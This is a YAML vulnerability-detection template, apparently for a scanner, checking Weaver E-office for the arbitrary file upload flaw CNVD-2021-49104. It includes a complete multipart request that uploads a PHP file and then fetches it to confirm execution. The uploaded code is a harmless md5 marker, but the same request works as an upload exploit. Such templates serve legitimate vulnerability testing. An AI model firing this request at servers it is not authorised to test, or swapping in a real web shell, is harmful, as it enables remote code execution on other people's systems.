app: Weaver
query: app:"Weaver"
meta:
  name: CNVD-2021-49104
  level: 4
  tags:
  - file_upload
  description: The Pan Wei Micro E-office version running allows arbitrary file uploads
    from a remote attacker.
  homepage: ""
  author: X prism
  references: ""
  solution: Pan Wei has released an update to resolve this vulnerability.
  create_at: "2024-07-13 11:58:46"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
          params: |-
            --e64bdf16c554bbc109cecef6451c26a4
                    Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
                    Content-Type: image/jpeg

                    <?php echo md5('CNVD-2021-49104');?>

                    --e64bdf16c554bbc109cecef6451c26a4--
        response:
        - name: code
          value: "200"
          type: equals
      - request:
          method: POST
          path: /images/logo/logo-eoffice.php
          redirect: true
          header: []
          params: ""
        response:
        - name: body
          value: 94d01a2324ce38a2e29a629c54190f67
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
